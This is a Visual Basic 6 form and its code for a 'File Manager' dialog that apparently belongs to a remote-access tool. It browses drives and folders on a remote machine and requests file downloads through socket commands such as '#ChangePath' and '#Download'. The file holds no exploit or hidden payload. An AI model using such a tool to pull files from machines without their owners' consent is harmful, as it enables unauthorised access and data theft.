VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "ComDlg32.OCX"
Begin VB.Form frm_FileManager 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "File Manager"
   ClientHeight    =   4140
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   6345
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4140
   ScaleWidth      =   6345
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin MSComDlg.CommonDialog cdlg_Save 
      Left            =   5160
      Top             =   120
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComctlLib.ProgressBar pbr_Progress 
      Height          =   300
      Left            =   960
      TabIndex        =   7
      Top             =   3120
      Width           =   4770
      _ExtentX        =   8414
      _ExtentY        =   529
      _Version        =   393216
      BorderStyle     =   1
      Appearance      =   0
      Scrolling       =   1
   End
   Begin VB.PictureBox pic_Download 
      AutoSize        =   -1  'True
      BorderStyle     =   0  'None
      Height          =   300
      Left            =   600
      Picture         =   "frm_FileManager.frx":0000
      ScaleHeight     =   300
      ScaleWidth      =   300
      TabIndex        =   6
      Top             =   3120
      Width           =   300
   End
   Begin VB.PictureBox pic_Go 
      AutoSize        =   -1  'True
      BorderStyle     =   0  'None
      Height          =   300
      Left            =   5385
      Picture         =   "frm_FileManager.frx":04F2
      ScaleHeight     =   300
      ScaleWidth      =   300
      TabIndex        =   5
      Top             =   720
      Width           =   300
   End
   Begin MSComctlLib.ImageCombo cbo_Path 
      Height          =   330
      Left            =   585
      TabIndex        =   4
      Top             =   720
      Width           =   4695
      _ExtentX        =   8281
      _ExtentY        =   582
      _Version        =   393216
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
   End
   Begin MSComctlLib.ImageList iml_General 
      Left            =   4545
      Top             =   0
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   16777215
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   5
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frm_FileManager.frx":09E4
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frm_FileManager.frx":0D36
            Key             =   ""
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frm_FileManager.frx":1088
            Key             =   ""
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frm_FileManager.frx":13DA
            Key             =   ""
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frm_FileManager.frx":172C
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin MSComctlLib.ListView lbx_Folder 
      Height          =   1935
      Left            =   585
      TabIndex        =   1
      Top             =   1110
      Width           =   2535
      _ExtentX        =   4471
      _ExtentY        =   3413
      View            =   2
      LabelEdit       =   1
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      _Version        =   393217
      Icons           =   "iml_General"
      SmallIcons      =   "iml_General"
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      NumItems        =   0
   End
   Begin MSComctlLib.ImageCombo cbo_Drive 
      Height          =   330
      Left            =   1665
      TabIndex        =   0
      Top             =   270
      Width           =   2655
      _ExtentX        =   4683
      _ExtentY        =   582
      _Version        =   393216
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      ImageList       =   "iml_General"
   End
   Begin MSComctlLib.ListView lbx_File 
      Height          =   1935
      Left            =   3225
      TabIndex        =   2
      Top             =   1110
      Width           =   2535
      _ExtentX        =   4471
      _ExtentY        =   3413
      View            =   2
      LabelEdit       =   1
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      _Version        =   393217
      Icons           =   "iml_General"
      SmallIcons      =   "iml_General"
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      NumItems        =   0
   End
   Begin VB.Label lbl_Label 
      BackStyle       =   0  'Transparent
      Height          =   195
      Index           =   1
      Left            =   600
      TabIndex        =   8
      Top             =   3480
      Width           =   5205
   End
   Begin VB.Label lbl_Label 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Select Drive:"
      Height          =   195
      Index           =   0
      Left            =   600
      TabIndex        =   3
      Top             =   315
      Width           =   915
   End
End
Attribute VB_Name = "frm_FileManager"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub cbo_Drive_Click()
    frm_Main.sok_Server.SendData "#ChangePath" & Left(frm_FileManager.cbo_Drive.SelectedItem.Text, 2) & "\"
    frm_FileManager.cbo_Path.Text = Left(frm_FileManager.cbo_Drive.SelectedItem.Text, 2) & "\"
End Sub

Private Sub cbo_Path_KeyPress(KeyAscii As Integer)
    If KeyAscii = 13 Then
        Call pic_Go_Click
    End If
End Sub

Private Sub lbx_Folder_DblClick()
    On Error GoTo Err
    If frm_FileManager.lbx_Folder.SelectedItem.Index <> 1 Then
        frm_FileManager.cbo_Path.Text = frm_FileManager.cbo_Path.Text & frm_FileManager.lbx_Folder.SelectedItem.Text & "\"
        frm_Main.sok_Server.SendData "#ChangePath" & frm_FileManager.cbo_Path.Text
    Else
        If Len(frm_FileManager.cbo_Path.Text) > 3 Then
            frm_FileManager.cbo_Path.Text = Left(frm_FileManager.cbo_Path.Text, Len(frm_FileManager.cbo_Path.Text) - 1)
            frm_FileManager.cbo_Path.Text = Left(frm_FileManager.cbo_Path.Text, InStrRev(frm_FileManager.cbo_Path.Text, "\") - 1)
            frm_Main.sok_Server.SendData "#ChangePath" & frm_FileManager.cbo_Path.Text & "\"
            frm_FileManager.cbo_Path.Text = frm_FileManager.cbo_Path.Text & "\"
        End If
    End If
    Exit Sub
    
Err:
    MsgBox Err.Description, vbCritical
End Sub

Private Sub pic_Download_Click()
    Dim v_sFilePath As String

    v_sFilePath = frm_FileManager.cbo_Path.Text & frm_FileManager.lbx_File.SelectedItem.Text
    If frm_FileManager.lbx_File.SelectedItem.Index > 0 Then
        frm_FileManager.cdlg_Save.DialogTitle = "Save File"
        frm_FileManager.cdlg_Save.FileName = Left(frm_FileManager.lbx_File.SelectedItem.Text, Len(frm_FileManager.lbx_File.SelectedItem.Text) - 4)
        frm_FileManager.cdlg_Save.Filter = "*." & Right(frm_FileManager.lbx_File.SelectedItem.Text, 3) & "|*." & Right(frm_FileManager.lbx_File.SelectedItem.Text, 3)
        frm_FileManager.cdlg_Save.ShowSave
        
        If frm_FileManager.cdlg_Save.FileName <> "" Then
            frm_Main.sok_Server.SendData "#Download" & v_sFilePath
        End If
    End If
End Sub

Private Sub pic_Go_Click()
    frm_Main.sok_Server.SendData "#ChangePath" & frm_FileManager.cbo_Path.Text
End Sub
